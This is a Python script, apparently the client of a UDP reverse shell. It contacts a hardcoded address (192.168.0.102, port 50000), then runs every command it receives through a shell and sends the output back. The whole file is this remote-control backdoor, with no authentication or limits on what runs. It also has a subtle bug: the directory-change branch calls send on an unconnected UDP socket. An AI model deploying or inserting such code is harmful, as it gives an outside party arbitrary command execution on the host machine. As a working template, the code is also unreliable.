##########################################################
#                Functions of the Client                 #
# Create a UDP socket.                                   #
# Connect to the server.                                 #
# Receive commands from the server.                     #
# Execute commands locally and handle 'cd' commands.    #
# Send the response back to the server.                 #
# Close the socket when communication is finished.      #
##########################################################

import socket
import os
import subprocess


# Create a UDP socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
host = "192.168.0.102"
port = 50000

server_address = (host,port)
s.sendto(str.encode("Client ready"), server_address)

# Receive Instructions
while True:

     # Check the received data to determine actions will be done
     data, server = s.recvfrom(1024)  # 1024 Buffer Size
     decoded_data = data.decode("utf-8")
     if decoded_data[:2] == 'cd':  # Handle 'cd' command
         path = decoded_data[3:].strip()  # Extract the directory path
         if os.path.exists(path):  # Check if the path exists
             os.chdir(path)  # Change the current working directory
             s.send(str.encode(f"Changed directory to {os.getcwd()}\n"))
         else:
             s.send(str.encode(f"Error: Directory '{path}' does not exist.\n"))
     elif len(data) > 0:
         # subprocess.open helps to run the entered command as if you are in a real terminal
         cmd = subprocess.Popen(data[:].decode("utf-8"),  # convert received data from Bytes to string
                                shell=True,  # To execute commands in a shell
                                stdout=subprocess.PIPE,  # To store the output of any entered command in that pipe
                                stdin=subprocess.PIPE,  # To store the inputs of any entered command in that pipe
                                stderr=subprocess.PIPE  # To store Error messages generated in that pipe.
                                )
         # we have to send output to the server
         output_byte = cmd.stdout.read() + cmd.stderr.read()
         output_str = str(output_byte, "utf-8")
         s.sendto(str.encode(output_str),server)
         print(output_str)  # to print result on the server's computer

